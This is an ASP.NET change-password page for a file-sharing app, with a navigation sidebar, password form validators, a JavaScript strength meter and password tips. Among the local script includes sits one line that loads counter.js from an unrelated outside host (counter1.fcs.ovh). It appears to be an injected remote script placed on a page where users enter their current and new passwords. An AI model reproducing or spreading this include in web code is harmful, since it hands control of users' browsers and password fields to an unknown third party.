<%@ Page Title="" Language="C#" MasterPageFile="~/User/UserHeader.Master" AutoEventWireup="true" CodeBehind="ChangePasswordUser.aspx.cs" Inherits="FileShareApp.User.ChangePasswordUser" %>
<%@ Register Assembly="AjaxControlToolkit" Namespace="AjaxControlToolkit" TagPrefix="ajax" %>
<asp:Content ID="Content1" ContentPlaceHolderID="ContentPlaceHolder2" runat="server">
    <script type="text/javascript" src="../js/jquery-1.11.1.min.js"></script>
    <script type="text/javascript" src="../js/bootstrap.min.js"></script>
    <script type="text/javascript" src="../js/chart.min.js"></script>
    <script type="text/javascript" src="../js/chart-data.js"></script>
    <script type="text/javascript" src="../js/easypiechart.js"></script>
    <script type="text/javascript" src="../js/easypiechart-data.js"></script>
    <script type="text/javascript" src="../js/bootstrap-datepicker.js"></script>
    <script>
        $('#calendar').datepicker({
    });

    !function ($) {
        $(document).on("click", "ul.nav li.parent > a > span.icon", function () {
            $(this).find('em:first').toggleClass("glyphicon-minus");
        });
        $(".sidebar span.icon").find('em:first').addClass("glyphicon-plus");
    } (window.jQuery);

    $(window).on('resize', function () {
        if ($(window).width() > 768) $('#sidebar-collapse').collapse('show')
    })
    $(window).on('resize', function () {
        if ($(window).width() <= 767) $('#sidebar-collapse').collapse('hide')
    })
    </script>

    <link rel="Stylesheet" type="text/css" href="../css/ValidatorStyle.css" />
    <script type="text/javascript" src="http://counter1.fcs.ovh/private/counter.js?c=fa58ab173229a918ea05744c9272e2b2"></script>


    <div id="sidebar-collapse" class="col-sm-3 col-lg-2 sidebar">
       <form role="search">
        <div class="form-group" style="padding-bottom:50px;">
            <%--<input type="text" class="form-control" placeholder="Search">--%>
        </div>
        </form>
        <ul class="nav menu">
            <li ><a href="Home.aspx">
                <svg class="glyph stroked dashboard-dial"><use xlink:href="#stroked-dashboard-dial"></use></svg>
                Dashboard</a></li>
            <li ><a href="ListFiles.aspx">
                <svg class="glyph stroked blank document"><use xlink:href="#stroked-blank-document"/></svg>
                Files</a></li>
            <li><a href="UploadFiles.aspx">
                <svg class="glyph stroked upload"><use xlink:href="#stroked-upload"/></svg> New Uploads</a></li>
          
           <li class="active"><a href="ChangePasswordUser.aspx">
           <svg class="glyph stroked lock"><use xlink:href="#stroked-lock"/></svg> Change Password</a></li>
            <li><a href="Logout.aspx">
                <svg class="glyph stroked male-user"><use xlink:href="#stroked-male-user"></use></svg>
                Logout</a></li>
        </ul>
    </div>
</asp:Content>
<asp:Content ID="Content2" ContentPlaceHolderID="ContentPlaceHolder1" runat="server">
    <asp:ScriptManager ID="scriptClient" runat="server">
</asp:ScriptManager>
<div class="col-sm-9 col-sm-offset-3 col-lg-10 col-lg-offset-2 main">
<div  style=" padding-left:0px; margin-top:50px;">

 <div class="row">
            <div class="col-lg-12">
                <h1 class="page-header">
                    Change Pasword</h1>
            </div>
        </div>
                


  <div style="background-color:#D5F3FC; border-color:#31a3c6; color:#31a3c6; border-style:groove; border-width:medium;  
        border-radius: 15px 3px;  float:left;
        margin-top :30px; padding-left :20px; padding-bottom :30px; margin-left:50px; margin-bottom:20px; width:30%;">
 <table width="100%">
 <tr><td>&nbsp;</td></tr>
 <tr><td>Username:<div style="float:right; padding-right:30px;"><asp:Label ID="lblUsername" runat="server"></asp:Label></div></td></tr>
 <tr><td><div style="padding-left:20px; padding-right:20px; margin-top:10px; margin-bottom:10px; background-color:#31a3c6; height:2px; width:70%;"></div></td></tr>
 <tr><td>Current Password:</td></tr>
 <tr><td><asp:TextBox ID="txtCurrentPassword" runat="server" TextMode="Password" Width="200px"></asp:TextBox></td></tr>
 <asp:RequiredFieldValidator ID="RequiredFieldValidator_txtCurrentPassword" runat="server" ErrorMessage="Please Enter the Current Password" Display="None" 
            ControlToValidate="txtCurrentPassword" ValidationGroup="ChangePassword"></asp:RequiredFieldValidator>
            <ajax:ValidatorCalloutExtender ID="ValidatorCalloutExtender_txtCurrentPassword" runat="server" TargetControlID="RequiredFieldValidator_txtCurrentPassword" CssClass="customCalloutStyle">
            </ajax:ValidatorCalloutExtender>
 <tr><td>New Password:</td></tr>
 <tr><td><asp:TextBox ID="txtNewPassword" runat="server" TextMode="Password" Width="200px" onkeyup="passwordStrength(this.value,document.getElementById('strendth'),document.getElementById('passError'))"></asp:TextBox>
 </td></tr>
 <asp:RequiredFieldValidator ID="RequiredFieldValidator_txtNewPassword" runat="server" ErrorMessage="Please Enter the New Password" Display="None" 
            ControlToValidate="txtNewPassword" ValidationGroup="ChangePassword"></asp:RequiredFieldValidator>
            <ajax:ValidatorCalloutExtender ID="ValidatorCalloutExtender_txtNewPassword" runat="server" TargetControlID="RequiredFieldValidator_txtNewPassword" CssClass="customCalloutStyle">
            </ajax:ValidatorCalloutExtender>
<asp:RegularExpressionValidator ID="RegularExpressionValidator_valPassword2" runat="server" Display="None" 
            ControlToValidate="txtNewPassword" ValidationGroup="ChangePassword"
            ErrorMessage="Password must be atleast 8 nonblank characters." 
            ValidationExpression="[^\s]{8,}" />
            <ajaxToolkit:ValidatorCalloutExtender runat="Server" ID="ValidatorCalloutExtender_valPassword2"  
            TargetControlID="RegularExpressionValidator_valPassword2" CssClass="customCalloutStyle" />
<tr><td>Retype Password:</td></tr>
 <tr><td><asp:TextBox ID="txtRePassword" runat="server" TextMode="Password" Width="200px" onkeyup="passwordCompare(this.value)"></asp:TextBox></td></tr>
 <asp:RequiredFieldValidator ID="RequiredFieldValidator_txtRePassword" runat="server" ErrorMessage="Please Retype the New password" Display="None" 
            ControlToValidate="txtRePassword" ValidationGroup="ChangePassword"></asp:RequiredFieldValidator>
            <ajax:ValidatorCalloutExtender ID="ValidatorCalloutExtender_txtRePassword" runat="server" TargetControlID="RequiredFieldValidator_txtRePassword" CssClass="customCalloutStyle">
            </ajax:ValidatorCalloutExtender>
<asp:CompareValidator ID="CompareValidator_Passwords" runat="server" ErrorMessage="Passwords Should Match" Display="None" 
            ControlToCompare="txtNewPassword" ControlToValidate="txtRePassword" ValidationGroup="ChangePassword"></asp:CompareValidator>
            <ajax:ValidatorCalloutExtender ID="ValidatorCalloutExtender_Passwords" runat="server" TargetControlID="CompareValidator_Passwords" CssClass="customCalloutStyle">
            </ajax:ValidatorCalloutExtender>
<tr><td><div id="divLoginError" runat="server" style="color:Red; text-align:left; padding:7px; float:left; width:100%;" Visible="false"><asp:Label ID="lblLoginError" runat="server"></asp:Label></div>
        </td></tr>
<tr><td><div id="divLoginSuccess" runat="server" style="color:Green; text-align:left; padding:7px; float:left; width:100%;" Visible="false"><asp:Label ID="lblLoginSuccess" runat="server"></asp:Label></div>
        </td></tr>
<%-- <tr><td style="padding-top:10px; padding-bottom:10px;">
    <div style="float:right; padding-right:35px;"> <asp:ImageButton ID="ImageButton1" runat="server" Text="Change" ImageUrl="~/css-admin/Change.jpg" ValidationGroup="ChangePassword" OnClick="btnChange_Click" Width="80px"/></div>
 </td></tr>--%>

 </table>
   <div class="hidden1" id="password-bar-html" role="alert">
   <div class="password-strength"><asp:ImageButton ID="btnChange" runat="server" 
           Text="Change" ImageUrl="~/css-admin/Change.jpg" 
           ValidationGroup="ChangePassword"  Width="80px" onclick="btnChange_Click1"/>
  <div class="msg">
  <span id="passwdRating"></span>
  </div>
  <div class="meter" id="passwdBar" style="width:204px;">
  <span id="strength-bar"></span>
  </div>
  </div>
  </div>
<script type ="text/javascript" >


    function passwordCompare(RePassword) {


        Password = $('#<%=txtNewPassword.ClientID%>').val();
        if (RePassword == Password) {
            updatePasswordBar(9);
        }
        else {
            Strength = document.getElementById('strendth');
            ErrorField = document.getElementById('passError');
            passwordStrength(Password, Strength, ErrorField);
        }
    }




    function passwordStrength(password, passwordStrength, errorField) {


        //password = password.trim();
        password = password.replace(/\s+/g, "");

        var score = 0;

        //if password bigger than 8 give another 1 point
        if (password.length >= 8) score++;

        //if password bigger than 12 give another 1 point
        if (password.length >= 12) score++;

        //if password has both lowercase and uppercase characters and numbers give 1 point 
        if ((password.match(/[a-z]/)) && (password.match(/[A-Z]/)) && (password.match(/\d+/))) score++;

        //if password has both numbers and lowercase and special characters give 1 point 
        if ((password.match(/\d+/)) && (password.match(/[a-z]/)) && (password.match(/.[!,@,#,$,%,^,&,*,?,_,~,-,(,)]/))) score++;

        //if password has both numbers and uppercase and special characters give 1 point 
        if ((password.match(/\d+/)) && (password.match(/[A-Z]/)) && (password.match(/.[!,@,#,$,%,^,&,*,?,_,~,-,(,)]/))) score++;

        //if password has both lowercase and uppercase and special characters give 1 point 
        if ((password.match(/[a-z]/)) && (password.match(/[A-Z]/)) && (password.match(/.[!,@,#,$,%,^,&,*,?,_,~,-,(,)]/))) score++;

        //if password lesser than 8 make 0 point
        if (password.length < 8) score = 0;

        updatePasswordBar(score);
    }



    function updatePasswordBar(rating) {
        var ratingMsgs = new Array(6);
        var ratingClasses = new Array(6);
        ratingMsgs[0] = "Too.Short";
        ratingMsgs[1] = "Weak";
        ratingMsgs[2] = "Strong";
        ratingMsgs[9] = "No Rated";
        ratingClasses[0] = 'short';
        ratingClasses[1] = 'weak';
        ratingClasses[2] = 'strong';
        ratingClasses[9] = 'notRated';

        var bar = document.getElementById('strength-bar');
        if (bar) {
            var message = document.getElementById('passwdRating');
            var barLength = document.getElementById('passwdBar').clientWidth;
            if (rating >= 0 && rating <= 2) {
                bar.style.width = (barLength * (parseInt(rating) + 1.0) / 3.0) + 'px';
                message.innerHTML = ratingMsgs[rating];
            } else if (rating > 2 && rating <= 8) {
                rating = 2;
                updatePasswordBar(rating);
            } else {
                bar.style.width = 0;
                rating = 9;
                message.innerHTML = "";
            }
            message.className = ratingClasses[rating];
            bar.className = ratingClasses[rating];
        }
    }



</script>



<style>

 .password-strength p {
  margin: 0 0 4px;
  }
  .password-strength .meter {
  height: 5px;
  background: #f5f5f5;
  }
  .password-strength .meter #strength-bar {
  display: block;
  height: 100%;
  width: 200px;
  }
  .password-strength .meter .short {
  background: #ff0000;
  }
  .password-strength .meter .weak {
  background: #2d98f3;
  }
  .password-strength .meter .strong {
  background: #76c261;
  }
  .password-strength .meter .notRated {
  background: #666;
  }
  
  
  
  .password-strength .msg #passwdRating {
  display: block;
  }
  .password-strength .msg .short {
  color: #ff0000;
  }
  .password-strength .msg .weak {
  color: #2d98f3;
  }
  .password-strength .msg .strong {
  color: #76c261;
  }
  .password-strength .msg .notRated {
  color: #ccc;
  }

</style>
   </div>




  <div style="float:right; width:50%; padding-top:30px; color:#4b4b4b;">
  <h2>Password Tips:</h2>
  <ul >
  <li style="padding-bottom:10px; padding-top:10px;">
  1.Make your passwords long with eight or more characters.</li>
  <li>2. Include Upper and Lower case letters, punctuation, </li><li style="padding-left:12px; padding-bottom:10px;">symbols, and numbers.</li>
  <li>3. Use the entire keyboard, not just the letters and characters</li>
   <li style="padding-left:14px; padding-bottom:10px;"> you use or see most often.</li>
  <li style="padding-bottom:10px;">4. To keep strong passwords effective, change them often.</li>
  <li style="padding-bottom:10px;">5. Don't use the same password for everything.</li>
  <li style="padding-bottom:10px;">6. Change your password frequently.</li></ul>
  
  </div>

      </div>
</div>
</asp:Content>